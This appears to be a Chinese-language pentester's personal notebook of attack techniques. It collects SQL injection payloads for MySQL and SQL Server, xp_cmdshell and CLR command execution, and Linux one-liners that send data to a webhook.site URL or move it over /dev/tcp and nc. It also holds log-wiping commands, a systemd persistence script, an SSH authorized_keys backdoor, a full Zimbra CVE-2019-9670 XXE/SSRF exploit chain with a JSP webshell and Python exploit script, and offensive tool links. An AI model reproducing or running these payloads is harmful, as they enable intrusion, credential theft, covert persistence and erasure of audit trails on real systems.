判断注入类型-rand#数字型order by注入时,语句order by=2 and 1=2,和order by=2 and 1=1 显示的结果一样,所以无法用来判断注入点类型，而rand()在数字型中，每次刷新会显示不同的排序结果，当在字符型中用?sort=rand(),则不会有效果,排序不会改变，因此用rand()可判断注入点类型 select * from users order by rand() 结合if盲注# 数字型 ?order=if(表达式,2,3) # 知道列名 ?order=if(表达式,id,username) # 不知道列名，表达式为false时，sql语句会报ERROR 1242 (21000): Subquery returns more than 1 row的错误，导致查询内容为空 order=if(表达式,1,(select id from information_schema.tables)) 结合时间盲注order by if(表达式,1,sleep(1)) 结合报错order by updatexml(1,if(1=2,1,(表达式)),1) # 有报错信息 select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); # 布尔盲注，参考 LIMIT子句中的盲 SQL注入漏洞利用 https://xz.aliyun.com/t/5858 select * from tbl_albums where page=2 order by album_date asc LIMIT 0,ascii(substr((Select version()),1,1)) # 无回显，结合时间盲注，参考：https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html select id from users order by id limit 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(if(mid(version(),1,1) like 5, BENCHMARK(5000000,SHA1(1)),1))))),1) -- 服务端主机名，mysql所在服务器 select @@hostname -- 客户端主机名 select HOST from information_schema.PROCESSLIST # left(a,b)从左侧截取a的前b位 left(database(),1)>'s' # substr(a,b,c)从b位置开始，截取字符串a的c长度。ascii()将某个字符转换为ascii值 ascii(substr((select database()),1,1))=98 # mid(a,b,c)从位置b开始，截取a字符串的c位，ord()函数同ascii()，将字符转为ascii值 ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))>98 # regexp正则注入，user()结果为root，regexp为匹配root的正则表达式 # 参考链接：https://www.cnblogs.com/lcamry/articles/5717442.html select user() regexp '^[a-z]'; select user() regexp '^ro' # 查询权限 select @@secure_file_priv; select @@global.secure_file_priv; # 读文件，前两种需要`secure-file-priv`无值或为有利目录。都需要知道要读取的文件所在的绝对路径。要读取的文件大小必须小于`max_allowed_packet`所设置的值。 select load_file(file_path); load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n'; #读取服务端文件 load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n'; #读取客户端文件 # 低权限读文件，mysql 5.5.53 secure-file-priv=NULL 读文件payload，mysql8测试失败，mysql 5.7 可行，其他版本自测 drop table mysql.m1; CREATE TABLE mysql.m1 (code TEXT ); LOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '\n'; select * from mysql.m1; # @@secure_file_priv的值不为NULL select 1,2,3 into outfile 'd:\1.txt' select 1,2,3 into dumpfile 'd:\1.txt' 权限够，可以进行日志的设置操作 知道目标目录的绝对路径 # 请求日志 set global general_log_file = '/var/www/html/1.php'; set global general_log = on; select '<?php phpinfo();?>'; # 慢查询日志 set global slow_query_log_file='/var/www/html/2.php' set global slow_query_log=1; select '<?php phpinfo();?>'; 参考：https://blog.csdn.net/qq_40732354/article/details/99633971 步骤： 1.修改mysql配置文件，linux默认/etc/my.cnf 2.在文件中的 [mysqld] 下添加 skip-grant-tables = 1 3.重启mysql服务 systemctl restart mysqld 4.连接mysql，密码已置为空 # 修改my.ini max_allowed_packet = 32M #这个值越大越快,看内存 mysql -uroot -ppassword test -e "select now()" mysql -uroot -e "show databases;" mysqldump -h主机名 -P端口 -u用户名 -p密码 --databases database1,database2 > 文件名.sql select to_base64(user())

item.title: SQLServer
item.description: select db_name() select user_name() select user select is_srvrolemember('sysadmin'); -- 1或0 select is_member('db_owner'); select is_member('public') and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(''))-- and 1=(select '|'%2bname%2b'|' from master..sysdatabases FOR XML PATH(''))-- select quotename(name) from 数据库名..sysobjects where xtype='U' FOR XML PATH('') select '|'+name+'|' from 数据库名..sysobjects where xtype='U' FOR XML PATH('') select top 1 name from dbo.sysobjects where xtype='u' select top 1 name from dbo.sysobjects where xtype='u' and name not in ('adminusers') select top 1 col_name(object_id('adminusers'),1) from sysobjects) select top 1 col_name(object_id('adminusers'),{n}) from sysobjects convert() select convert(int,db_name()) cast() select cast(db_name() as int) file_name() db_name() col_name() filegroup_name() object_name() schema_name() type_name() DECLARE @user varchar(100); SELECT @user = (SELECT user); EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"'); -- 其他参考 https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/sql-injection/mssql-injection.md 开启xp_cmdshell-- 查看能否使用 xp_cmdshell，从MSSQL2005版本之后默认关闭 select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell' -- 开启xp_cmdshell execute('sp_configure "show advanced options",1') execute('reconfigure') execute('sp_configure "xp_cmdshell", 1') execute('reconfigure') -- 执行命令 exec xp_cmdshell 'whoami' xp_cmdshell被删除，可以尝试上传xplog70.dll进行恢复exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\xplog70.dll' 不依靠堆叠开启xp_cmdshell并执行命令-- 开启 select 1 from table_name exec sp_configure 'show advanced options',1 reconfigure; select 1 from table_name exec sp_configure 'xp_cmdshell',1 reconfigure; -- 执行 select 1 from table_name exec xp_cmdshell 'whoami'; -- 案例来源与实战中的cookie处存在SQL注入，由于分号问题（分号会被cookie作为分隔符导致堆叠失败）而引出的测试技巧 CREATE TABLE tmpTable (tmp1 varchar(8000)); insert into tmpTable(tmp1) exec master..xp_cmdshell 'ipconfig' select * from tmpTable -- 判断SP_OACREATE状态,如果存在返回1 select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE' 开启sp_oacreateEXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'show advanced options', 0; 调用wscript.shell组件执行命令-- wscript.shell可以设置为{72C24DD5-D70A-438B-8A42-98424B88AFB8} -- 无回显 declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c whoami' -- 回显 declare @shell int,@exec int,@text int,@str varchar(8000) exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'exec',@exec output,'C:\\Windows\\System32\\cmd.exe /c whoami' exec sp_oamethod @exec, 'StdOut', @text out exec sp_oamethod @text, 'readall', @str out select @str; 调用com组件执行命令-- Shell.Application可以设置为{13709620-C279-11CE-A49E-444553540000} DECLARE @object INT EXEC sp_OACreate 'Shell.Application', @object OUTPUT EXEC sp_OAMethod @object, 'ShellExecute', NULL, 'cmd.exe', '/c whoami > C:\inetpub\wwwroot\result.txt','C:\Windows\System32','','1' 适用于服务器开启了MSSQL Agent Job服务，并且服务器中当前运行的用户账号拥有足够的权限去创建并执行代理作业的情况SQL Server CLR执行命令 - 在SQL Server上能启用CLR并可以创建自定义存储过程，SQL Server当前账号具有执行命令/代码所需要的权限。 参考链接：MSSQL 利用 CLR 技术执行系统命令https://cloud.tencent.com/developer/article/1736431 编写CLR//1、安装Visual Studio和SQL Server数据库 //2、创建一个新的SQL Server数据库项目 //3、设置项目属性，目标平台修改为需要的目标平台，如SQL Server 2012; 将SQLCLR权限级别修改为UNSAFE；修改.Net 框架版本为自己需要的版本；语言选择C# //4、右键项目，选择添加->新建项，新建SQL CLR C# 存储过程 //5、填入测试代码 using System; using System.Data; using System.Data.SqlClient; using System.Data.SqlTypes; using Microsoft.SqlServer.Server; using System.Collections.Generic; using System.Text; using System.Threading.Tasks; public partial class StoredProcedures { [Microsoft.SqlServer.Server.SqlProcedure] public static void SqlStoredProcedure1 () { // 在此处放置代码 System.Diagnostics.Process process = new System.Diagnostics.Process(); process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden; process.StartInfo.FileName = "cmd.exe"; process.StartInfo.Arguments = "/C whoami > d:\\temp\\1.txt"; process.Start(); } } //6、将代码编译完成后，编译目录下会生成一个 DLL 文件，需要将 DLL 文件注册进目标数据库 开启CLREXEC sp_configure N'show advanced options', N'1' RECONFIGURE WITH OVERRIDE -- 开启clr enabled 选项 EXEC sp_configure N'clr enabled', N'1' RECONFIGURE WITH OVERRIDE -- 关闭所有服务器配置选项 EXEC sp_configure N'show advanced options', N'0' RECONFIGURE WITH OVERRIDE -- 如果存在权限问题，执行下面一段脚本 alter database [master] set TRUSTWORTHY on EXEC sp_changedbowner 'sa' 注册CLR-- 方法一：CLR 注册 DLL 支持十六进制的方式，以这种方式不需要将 DLL 文件落地到目标机器上，实现了无文件落地，能够规避杀软。并且，在目标无法处出网的情况下，也能完成操作 CREATE ASSEMBLY sp_cmdExec FROM 0x4D5A90000300000004000000FFFF0000B800000000000 WITH PERMISSION_SET = UNSAFE -- 方法二：将文件落地目标机器上后进行注册 CREATE ASSEMBLY sp_cmdExec FROM 'C:\ProgramData\Database1.dll' WITH PERMISSION_SET = UNSAFE 注册完后，创建存储过程CREATE PROCEDURE sp_cmdExec @Command [nvarchar](4000) WITH EXECUTE AS CALLER AS EXTERNAL NAME sp_cmdExec.StoredProcedures.CmdExec 执行命令EXEC sp_cmdExec 删除存储过程DROP sp_cmdExec; DROP ASSEMBLY sp_cmdExec; 如果没成功，可以换个数据库试试看。Exec OS Command Via MSSQL | Evi1cg's blog 差异备份 日志备份

item.title: Linux
item.description: find / -name 111.png | while read f;do echo 123 | tee $(dirname $f)/123.php;done //get curl https://webhook.site/b6deb5d8-e615-4280-9625-fe76f66f4531/`ps -ef|base64 -w 0` //post curl -d `ps -ef|base64 -w 0` https://webhook.site/b6deb5d8-e615-4280-9625-fe76f66f4531 //post, @后面跟 - , 代表输入输出 cat r.txt | curl -F data=@- https://webhook.site/b6deb5d8-e615-4280-9625-fe76f66f4531 exec 3<>/dev/tcp/192.168.8.128/9090;echo -e "GET /index.html HTTP/1.0\r\n" >&3;((while read line; do [[ "$line" == $'\r' ]] && break; done && cat) <&3) > test.sh grep -ir password /home/test/Desktop/Temp/ // -a 将文件视为文本文件 grep -a "hello" /var/log/binary_file tar -tf www.tar.gz tar -zcf ttt.tar.gz --exclude='*.txt' --exclude='*.png' ttt kill -9 $(pidof 'ping') //将shell.php的时间修改为index.html的时间 touch -r index.html shell.php echo 123 | base64 -w 0 xxd -c 9999 -p boot12.bin //有些系统可能开头空格没起作用，会记录当前命令，记得history查看下 set +o history;utmpdump /var/log/wtmp > /tmp/wtmp.file;sed -i '$d' /tmp/wtmp.file;utmpdump -r < /tmp/wtmp.file > /var/log/wtmp;rm /tmp/wtmp.file set +o history;utmpdump /var/log/lastlog > /tmp/lastlog.file;sed -i '$d' /tmp/lastlog.file;utmpdump -r < /tmp/lastlog.file > /var/log/lastlog;rm /tmp/lastlog.file //删除log.txt中123qwe所在行 sed -i '/123qwe/d' log.txt sed -i '100,$d' /root/.bash_history # 收 nc -nvlp 4444 > aaa # 发 nc -nv 192.168.30.35 4444 </usr/share/aaa //提取whoami的第一个字符判断是否为t time if [ $(whoami|cut -c 1) == t ]; then sleep 5; fi for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done # ls --help /???/?s --help # /bin/cat /etc/passwd /???/??t /???/??ss?? screen -ls screen -S 会话id(会话名) screen -R 会话id(会话名) ctrl a+d

item.title: systemctl维权脚本
item.description: #!/bin/bash # 获取所有开机自启的服务 services=$(systemctl list-unit-files --type=service --state=enabled | awk '{print $1}' | grep -v '^$') # 将服务转换为数组 service_array=($services) # 检查是否有可用的服务 if [ ${#service_array[@]} -eq 0 ]; then echo "system enable service not found" exit 1 fi # 随机选择一个服务 random_service=${service_array[RANDOM % ${#service_array[@]}]} # 获取服务的单位文件路径 unit_file_path=$(systemctl show -p FragmentPath "$random_service" | cut -d'=' -f2) # 检查单位文件是否存在 if [ ! -f "$unit_file_path" ]; then echo "service $random_service's file path not found" echo "please try again" exit 1 fi # 在 ExecStart 的下一行插入 echo 123 sed -i "/^ExecStart=/a ExecStartPost=-/bin/bash -c 'touch /tmp/admin'" "$unit_file_path" # 输出结果 echo "service file path: $unit_file_path" echo "add ExecStartPost in $random_service success"

item.title: linux敏感文件
item.description: 可能有用的文件/var/lib/mlocate.db //文件数据库，查看包含config的路径 locate mlocate.db config /etc/shadow /etc/hosts /etc/hostname /proc/self/cmdline /root/.bash_history /root/.viminfo /proc/self/environ ~/.ssh/authorized_keys //ssh公钥文件，比较鸡肋，可以结合命令执行 /etc/httpd/conf/httpd.conf //Apache配置文件 /root/.ssh/id_rsa /WEB-INF/web.xml /usr/local/tomcat/conf/tomcat-users.xml /etc/nginx/conf/nginx.conf

item.title: SSH公钥后门
item.description:
开启了sshd服务且支持公钥连接（文件为/etc/ssh/sshd_config）# 默认全回车即可设置为空密码登录key ssh-keygen -t rsa 默认生成的key在/home/当前用户/.ssh目录下
添加命令touch /tmp/1.txt到生成的公钥文件id_rsa.pub，将所有内容写入到靶机用户的authorized_keys文件中
攻击机连接靶机即可触发命令

我对这个公钥后门的理解是拿着公钥去执行command的内容，执行完了当然就断开连接了，那么可以换个思路，当执行完恶意命令后再执行一个bash命令，返回给登录用户一个shell，是不是就可以了呢？比如command设置为command="ping -c 1 fa.cye9n0.dnslog.cn && /bin/bash"
操作系统版本问题，可以尝试加一个bash -c 将命令编写为command="bash -c 'touch /tmp/1.sh'"的形式这个问题和1类似，因为执行的是反弹shell操作，所以在你的shell结束前会一直等待登录，其中如果ssh登录断掉shell也会断掉，反之亦然由于反弹shell会卡住登录，可能会引起管理员的注意，所以这个点可以只用来执行命令。实战环境记得先备份原文件！命令执行完后加一个还原覆盖操作，将原文件内容从新写入，复制、echo都可以，我这里用的echocommand="touch /tmp/1.txt && echo 'ssh-rsa  test@kali'>/home/test/.ssh/authorized_keys && /bin/bash" ssh-rsa  test@kali 触发后会还原原文件，一般这种操作用于结合其他利用，比如后门安装、计划任务啥的（ps：略显鸡肋，权限高其实可以直接写计划任务啥的，这一步似乎没太大必要）
Infecting SSH Public Keys with backdoors

item.title: webuploader

item.title: Zimbra XXE + SSRF
item.description:
参考zimbra RCE环境搭建到复现再到exp编写 https://xz.aliyun.com/t/7991#toc-5 zimbra RCE 漏洞利用 https://cloud.tencent.com/developer/article/1752450 安装依赖ubuntu ip addr: 192.168.8.129 apt-get install libgmp10 libperl5.18 unzip pax sysstat sqlite3 dnsmasq wget ubuntu环境需要为14，其他版本可能安装libperl5.18会报错，后续可能也会有一大堆问题，所以还是用14比较好 配置hostname和dns服务器vim /etc/hostname mail.test.com vim /etc/hosts 192.168.8.129 mail.test.com mail
vim /etc/dnsmasq.conf server=192.168.8.130 domain=test.com mx-host=test.com, mail.test.com, 5 mx-host=mail.test.com, mail.test.com, 5 listen-address=127.0.0.1
下载有漏洞版本的zimbra，解压，进入解压后的目录进行安装wget https://files.zimbra.com/downloads/8.6.0_GA/zcs-8.6.0_GA_1153.UBUNTU14_64.20141215151116.tgz tar xvf zcs-8.6.0_GA_1153.UBUNTU14_64.20141215151116.tgz cd zcs-8.6.0_GA_1153.UBUNTU14_64.20141215151116 sudo ./install.sh 安装时注意观察返回结果，可能会报错缺少依赖信息，按缺少的依赖补充安装即可 一些缺少的依赖可以直接用apt-get安装，对于缺少libgmp3c2，参考文章中的链接已失效，可以采用以下链接安装 wget http://launchpadlibrarian.net/70575439/libgmp3c2_4.3.2+dfsg-2ubuntu1_amd64.deb sudo dpkg -i libgmp3c2_4.3.2+dfsg-2ubuntu1_amd64.deb 安装配置zimbra复现时使用的是dnsmasq，所以除了zimbra-dnscache选择 n ，其他默认 y 即可。 之后会进入Main menu界面，选择 6 配置 zimbra-store，选择 4 设置管理员密码，之后输入 a 应用配置，之后默认yes，最后保存更新系统设置yes即可 安装完成后，访问登陆界面即可 https://192.168.8.129:7071/zimbraAdmin 漏洞路由https://192.168.8.130:7071/Autodiscover/Autodiscover.xml 使用burpsuite或者其他接口测试工具以post方式发送一个空标签，Content-Type设置为application/xml，界面返回400解析错误，可能存在xxe
构造XML Poc验证是否存在XXE漏洞<!DOCTYPE asd [ <!ELEMENT name ANY > <!ENTITY asd SYSTEM "file:///etc/passwd" >]> <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"> <Request> <EMailAddress>asdasd@ad.com</EMailAddress> <AcceptableResponseSchema>&asd;</AcceptableResponseSchema> </Request> </Autodiscover> 页面503，返回了读取的文件信息，存在XXE
利用xxe获取localconfig.xml 中的用户名和密码，由于localconfig.xml为XML文件，需要加上CDATA标签才能作为文本读取，由于XXE不能内部实体进行拼接，所以此处需要使用外部dtd，payload构造如下：<!ENTITY % file SYSTEM "file:../conf/localconfig.xml"> <!ENTITY % start "<![CDATA["> <!ENTITY % end "]]>"> <!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>"> 启动远程服务，发送如下payload，利用xxe读取默认用户zimbra的密码，密码字段在zimbra_ldap_passwordPOST /Autodiscover/Autodiscover.xml HTTP/1.1 Host: 192.168.8.130:7071 Content-Length: 400 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63 Content-Type: application/soap+xml; charset=UTF-8 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close <!DOCTYPE Autodiscover [ <!ENTITY % dtd SYSTEM "http://192.168.8.129:99/1.txt"> %dtd; %all; ]> <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"> <Request> <EMailAddress>aaaaa</EMailAddress> <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema> </Request> </Autodiscover> 成功读取到密码
利用前面的xxe漏洞读取到的账号密码，获取一个低权限tokenPOST /service/soap HTTP/1.1 Host: 192.168.8.130 Content-Length: 463 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63 Content-Type: application/soap+xml; charset=UTF-8 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"> <soap:Header> <context xmlns="urn:zimbra"> <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/> </context> </soap:Header> <soap:Body> <AuthRequest xmlns="urn:zimbraAccount"> <account by="adminName">zimbra</account> <password>lDsiZPjl</password> </AuthRequest> </soap:Body> </soap:Envelope> 这里是向客户端登陆处/service/soap发送，也可以向管理员登陆处7071端口/service/admin/soap发送payload直接获取高权限token，注意下改端口以及将<AuthRequest xmlns="urn:zimbraAccount">改为<AuthRequest xmlns="urn:zimbraAdmin">
将获取到的低权限token设置到cookie中，探测是否存在ssrf，注意，修改cookie时如果401错误，将cookie字段ZM_AUTH_TOKEN改为ZM_ADMIN_AUTH_TOKEN即可POST /service/proxy?target=https://abcd.0lzme4.dnslog.cn HTTP/1.1 Host: 192.168.8.130:7071 Content-Length: 0 Cookie: ZM_ADMIN_AUTH_TOKEN=0_445fad824269f204515a7c310c0fc7fbfcfc425c_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313637383737333133323439343b747970653d363a7a696d6272613b7469643d31303a313338303230313330343b User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63 Content-Type: application/soap+xml; charset=UTF-8 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close


ssrf可利用后，结合低权限token获取一个高权限token，将<AuthRequest xmlns="urn:zimbraAccount">改为<AuthRequest xmlns="urn:zimbraAdmin">POST /service/proxy?target=https://192.168.8.130:7071/service/admin/soap HTTP/1.1 Host: 192.168.8.130:7071 Content-Length: 461 Cookie: ZM_ADMIN_AUTH_TOKEN=0_445fad824269f204515a7c310c0fc7fbfcfc425c_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313637383737333133323439343b747970653d363a7a696d6272613b7469643d31303a313338303230313330343b User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63 Content-Type: application/soap+xml; charset=UTF-8 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"> <soap:Header> <context xmlns="urn:zimbra"> <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/> </context> </soap:Header> <soap:Body> <AuthRequest xmlns="urn:zimbraAdmin"> <account by="adminName">zimbra</account> <password>lDsiZPjl</password> </AuthRequest> </soap:Body> </soap:Envelope>
利用获取到的高权限token调用文件上传接口/service/extension/clientUploader/upload，上传webshellPOST /service/extension/clientUploader/upload HTTP/1.1 Host: 192.168.8.130:7071 Cookie: ZM_ADMIN_AUTH_TOKEN=0_20a7b6a582e9cbfdceb69a240f06aef59fccc313_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313637383634333538333438363b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d31303a313738313434363538303b User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyfguo5iLr5MUuhaZ Content-Length: 622 ------WebKitFormBoundaryyfguo5iLr5MUuhaZ Content-Disposition: form-data; name="filename1" qweqwe ------WebKitFormBoundaryyfguo5iLr5MUuhaZ Content-Disposition: form-data; name="clientFile";filename="aa.jsp" <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while ((a = in.read(b)) != -1) { out.print(new String(b)); } out.print("</pre>"); %> ------WebKitFormBoundaryyfguo5iLr5MUuhaZ Content-Disposition: form-data; name="requestId" 111111 ------WebKitFormBoundaryyfguo5iLr5MUuhaZ-- webshell地址，访问时需要带上cookiehttps://192.168.8.130/downloads/aa.jsp 参考https://github.com/rek7/Zimbra-RCE#!/usr/bin/python3 # Title: Zimbra Autodiscover Servlet XXE and ProxyServlet SSRF <= 8.7.0 and 8.7.11 # Shodan Dork: 8.6.0_GA_1153 # Vendor Homepage: https://www.zimbra.com/ # Version: <= 8.7.0 and 8.7.11 # Tested on: Debian # CVE : CVE-2019-9670 # References: # http://www.rapid7.com/db/modules/exploit/linux/http/zimbra_xxe_rce import requests import sys import urllib.parse import re import argparse from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) class zimbra_rce(object): def __init__(self, base_url, dtd_url, file_name, payload_file): self.base_url = base_url self.dtd_url = dtd_url self.low_auth = {} self.file_name = file_name self.payload = open(payload_file, "r").read() self.pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>") def upload_dtd_payload(self): ''' Example DTD payload: <!ENTITY % file SYSTEM "file:../conf/localconfig.xml"> <!ENTITY % start "<![CDATA["> <!ENTITY % end "]]>"> <!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>"> ''' xxe_payload = r"""<!DOCTYPE Autodiscover [ <!ENTITY % dtd SYSTEM "{}"> %dtd; %all; ]> <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"> <Request> <EMailAddress>aaaaa</EMailAddress> <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema> </Request> </Autodiscover>""".format(self.dtd_url) headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63', "Content-Type":"application/xml" } print("[*] Uploading DTD.", end="\r") dtd_request = requests.post(self.base_url+"/Autodiscover/Autodiscover.xml",data=xxe_payload,headers=headers,verify=False,timeout=15) # print(r.text) if 'response schema not available' not in dtd_request.text: print("[-] Site Not Vulnerable To XXE.") return False else: print("[+] Uploaded DTD.") print("[*] Attempting to extract User/Pass.", end="\r") pattern_name = re.compile(r"<key name=(\"|")zimbra_user(\"|")>\n.*?<value>(.*?)<\/value>") pattern_password = re.compile(r"<key name=(\"|")zimbra_ldap_password(\"|")>\n.*?<value>(.*?)<\/value>") if pattern_name.findall(dtd_request.text) and pattern_password.findall(dtd_request.text): username = pattern_name.findall(dtd_request.text)[0][2] password = pattern_password.findall(dtd_request.text)[0][2] self.low_auth = {"username" : username, "password" : password} print("[+] Extracted Username: {} Password: {}".format(username, password)) return True print("[-] Unable To extract User/Pass.") return False def make_xml_auth_body(self, xmlns, username, password): auth_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"> <soap:Header> <context xmlns="urn:zimbra"> <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/> </context> </soap:Header> <soap:Body> <AuthRequest xmlns="{}"> <account by="adminName">{}</account> <password>{}</password> </AuthRequest> </soap:Body> </soap:Envelope>""" return auth_body.format(xmlns, username, password) def gather_low_auth_token(self): print("[*] Getting Low Privilege Auth Token", end="\r") headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63', "Content-Type":"application/xml" } r=requests.post(self.base_url+"/service/soap",data=self.make_xml_auth_body( "urn:zimbraAccount", self.low_auth["username"], self.low_auth["password"] ), headers=headers, verify=False, timeout=15) low_priv_token = self.pattern_auth_token.findall(r.text) if low_priv_token: print("[+] Gathered Low Auth Token.") return low_priv_token[0].strip() print("[-] Failed to get Low Auth Token") return False def ssrf_admin_token(self, low_priv_token): headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63', "Content-Type":"application/xml" } headers["Host"]="{}:7071".format(urllib.parse.urlparse(self.base_url).netloc.split(":")[0]) print("[*] Getting Admin Auth Token By SSRF", end="\r") r = requests.post(self.base_url+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap/AuthRequest", data=self.make_xml_auth_body( "urn:zimbraAdmin", self.low_auth["username"], self.low_auth["password"] ), verify=False, headers=headers, cookies={"ZM_ADMIN_AUTH_TOKEN":low_priv_token} ) admin_token = self.pattern_auth_token.findall(r.text) if admin_token: print("[+] Gathered Admin Auth Token.") return admin_token[0].strip() print("[-] Failed to get Admin Auth Token") return False def upload_payload(self, admin_token): f = { 'filename1':(None, "whatszimbra", None), 'clientFile':(self.file_name, self.payload, "text/plain"), 'requestId':(None, "12356721-3268-3782", None), } cookies = { "ZM_ADMIN_AUTH_TOKEN":admin_token } print("[*] Uploading file", end="\r") r = requests.post(self.base_url+"/service/extension/clientUploader/upload",files=f, cookies=cookies, verify=False ) if r.status_code == 200: r = requests.get(self.base_url + "/downloads/" + self.file_name, cookies=cookies, verify=False ) if r.status_code != 404: # some jsp shells throw a 500 if invalid parameters are given print("[+] Uploaded file to: {}/downloads/{}".format(self.base_url, self.file_name)) print("[+] You may need the need cookie: \n{}={};".format("ZM_ADMIN_AUTH_TOKEN", cookies["ZM_ADMIN_AUTH_TOKEN"])) return True print("[-] Cannot Upload File.") return False def exploit(self): try: if self.upload_dtd_payload(): low_auth_token = self.gather_low_auth_token() if low_auth_token: admin_auth_token = self.ssrf_admin_token(low_auth_token) if admin_auth_token: return self.upload_payload(admin_auth_token) except Exception as e: print("Error: {}".format(e)) return False if __name__ == "__main__": parser = argparse.ArgumentParser(description='Zimbra RCE CVE-2019-9670') parser.add_argument('-u', '--url', action='store', dest='url', help='Target url', required=True) parser.add_argument('-d', '--dtd', action='store', dest='dtd', help='Url to DTD', required=True) parser.add_argument('-n', '--name', action='store', dest='payload_name', help='Name of uploaded payload', required=True) parser.add_argument('-f', '--file', action='store', dest='payload_file', help='File containing payload', required=True) results = parser.parse_args() z = zimbra_rce(results.url, results.dtd, results.payload_name, results.payload_file) z.exploit()

item.title: 其他工具
item.description:
powershell代码混淆工具https://github.com/tokyoneon/Chimera密码生成器
https://github.com/t3l3machus/psudohash
https://github.com/BeichenDream/GodzillaMemoryShellProject 哥斯拉内存马，仅代码 作者亲自写的，保证兼容性，实战时套在反序列化/jndi/el表达式/SSTI等漏洞入口上。
https://github.com/feihong-cs/Java-Rce-Echo 回显马，仅代码 适合中间件回显或者内存马学习，都是jsp写的，稍加改造可以套在反序列化/jndi/el表达式/SSTI等漏洞入口上。
https://github.com/SafeGroceryStore/MDUT 数据库利用工具，GUI 非常实用的数据库利用工具，特别是Oracle的利用，几乎无可替代。
https://webhook.site/http请求在线监听，也有其他请求监听
https://github.com/1n7erface/Template.gitTemplate - 启发式内网扫描。可以用来爆破数据库
https://github.com/WangYihang/GitHacker通过winrm协议进行横向，支持密码登录、ntlm hash登录、证书公钥私钥登录
